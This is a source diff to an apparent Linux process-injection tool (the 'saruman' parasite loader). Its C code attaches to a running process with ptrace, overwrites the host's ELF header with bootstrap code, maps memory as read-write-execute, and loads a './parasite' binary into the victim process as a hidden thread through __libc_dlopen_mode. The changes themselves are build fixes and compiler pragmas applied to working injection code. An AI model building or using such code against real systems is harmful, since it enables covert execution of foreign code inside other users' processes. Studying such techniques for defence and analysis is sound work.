@@ -4,6 +4,8 @@
  */
 
 #include "saruman.h"
+#include <sys/time.h>
+#include <sys/wait.h>
 
 #define STACK_TOP(x) (x - STACK_SIZE)
 #define __BREAKPOINT__ __asm__ __volatile__("int3"); 
@@ -53,6 +55,7 @@ int pt_mprotect(handle_t *, void *, size_t, int);
 int pt_create_thread(handle_t *h, void (*)(void *), void *, uint64_t);
 
 
+int pid_detach_direct(pid_t);
 void toggle_ptrace_state(handle_t *, int);
 int pid_attach(handle_t *);
 int pid_detach(handle_t *);
@@ -103,6 +106,9 @@ void *heapAlloc(size_t len)
  * mapping large enough to hold the parasite loading
  * code.
  */
+#pragma GCC push_options
+#pragma GCC optimize ("O0")
+
 __PAYLOAD_KEYWORDS__ uint64_t bootstrap_code(void * vaddr, uint64_t size, void *stack)
 {
 	volatile void *mem;
@@ -179,7 +185,7 @@ __PAYLOAD_KEYWORDS__ int load_exec(const char *path,
 	volatile int fd;
 	
 	fd = evil_open(path, O_RDONLY);
-	m1 = evil_mmap((void *)PAGE_ALIGN(textVaddr), 
+	m1 = evil_mmap((void *)_PAGE_ALIGN(textVaddr), 
 			PAGE_ROUND(textSize), 
 			PROT_READ|PROT_WRITE|PROT_EXEC, 
 			MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS,
@@ -190,7 +196,7 @@ __PAYLOAD_KEYWORDS__ int load_exec(const char *path,
 	 */	
 	evil_read(fd, (uint8_t *)m1, textSize);
 
-	m2 = evil_mmap((void *)PAGE_ALIGN(dataVaddr),
+	m2 = evil_mmap((void *)_PAGE_ALIGN(dataVaddr),
 			PAGE_ROUND(dataSize) + PAGE_SIZE,
 			PROT_READ|PROT_WRITE,
 			MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS,
@@ -204,14 +210,14 @@ __PAYLOAD_KEYWORDS__ int load_exec(const char *path,
 	/*
 	 * off is distance from beginning of page aligned data vaddr to start of data p_vaddr
 	 */
-	off = dataVaddr - PAGE_ALIGN(dataVaddr);
+	off = dataVaddr - _PAGE_ALIGN(dataVaddr);
 	data = (uint8_t *)(uint64_t)(m2 + off);
 	/*
 	 * Read in data segment to m2
 	 */
 	evil_read(fd, data, dataSize);
 	
-	brk_addr = PAGE_ALIGN(dataVaddr) + dataSize;
+	brk_addr = _PAGE_ALIGN(dataVaddr) + dataSize;
 	evil_brk((void *)PAGE_ROUND(brk_addr));
 
 	__RETURN_VALUE__(m2);
@@ -351,7 +357,6 @@ __PAYLOAD_KEYWORDS__ int create_thread(void (*fn)(void *), void *data, unsigned 
                  "S" (newstack));
 
         if (retval < 0) {
-                errno = -retval;
                 retval = -1;
 		__RETURN_VALUE__(retval);
         }
@@ -393,7 +398,7 @@ __PAYLOAD_KEYWORDS__ size_t evil_write(long fd, void *buf, unsigned long len)
         asm("mov %%rax, %0" : "=r"(ret));
         return ret;
 }
-
+#pragma GCC pop_options
 
 /*
  * This function is only here so we can calculate
@@ -689,7 +694,6 @@ int call_fn(functionPayloads_t func, handle_t *h, uint64_t ip)
 
 		
 	pt_reg->rip = entry_point;
-	
 	switch(argc) {
 		case 1:
 			pt_reg->rdi = (uintptr_t)h->payloads.function[func].args[0];
@@ -796,7 +800,7 @@ int pt_create_thread(handle_t *h, void (*fn)(void *), void *data, uint64_t stack
 	h->payloads.function[CREATE_THREAD].args[0] = (void *)fn;
 	h->payloads.function[CREATE_THREAD].args[1] = data;
 	h->payloads.function[CREATE_THREAD].args[2] = (void *)(uint64_t)stack;
-	
+
 	if (call_fn(CREATE_THREAD, h, 0) < 0) {
 		printf("call_fn(CREATE_THREAD, ...) failed: %s\n", strerror(errno));
 		return -1;
@@ -920,7 +924,7 @@ int run_exec_loader_dlopen(handle_t *h)
 	DBG_MSG("[DEBUG]-> parasite path: %s\n", tmp);
 
 	h->payloads.function[DLOPEN_EXEC_LOADER].args[0] = (void *)ascii_storage; /* "./parasite" */
-	
+
 	DBG_MSG("[DEBUG]-> address of __libc_dlopen_mode(): %p\n", 
 	h->payloads.function[DLOPEN_EXEC_LOADER].args[1]);
 
@@ -1040,6 +1044,7 @@ int run_bootstrap(handle_t *h)
 	 * h->remote.base contains the address of the hosts text segment where
 	 * we overwrite the ELF file hdr and phdr's with bootstrap_code()
 	 */
+	printf("Calling bootstrap code\n");
 	if (call_fn(BOOTSTRAP_CODE, h, h->remote.base)) {
 		printf("call_fn(BOOTSTRAP_CODE, ...) failed: %s\n", strerror(errno));
 		return -1;
@@ -1083,16 +1088,16 @@ Elf64_Addr randomize_base(void)
 	
 	struct timeval tv;
 	
-	gettimeofday(&tv);
+	gettimeofday(&tv, NULL);
 	srand(tv.tv_usec); 
 	
 	b = rand() % 0xF;
 	b <<= 24;
 	
-	gettimeofday(&tv);
+	gettimeofday(&tv, NULL);
 	srand(tv.tv_usec);
 
-        v = PAGE_ALIGN(b + (rand() & 0x0000ffff));
+        v = _PAGE_ALIGN(b + (rand() & 0x0000ffff));
 	
 	return (uint64_t)v;
 }
@@ -1147,7 +1152,7 @@ int map_elf_binary(handle_t *h,  const char *path)
 	for (i = 0; i < ehdr->e_phnum; i++) {
 		switch(phdr[i].p_type) {		
 			case PT_LOAD:
-				switch (!(!(phdr[i].p_offset))) {
+				switch (!!phdr[i].p_offset) {
 					case 0:
 						printf("[+] Found text segment\n");
 						h->textVaddr = phdr[i].p_vaddr;
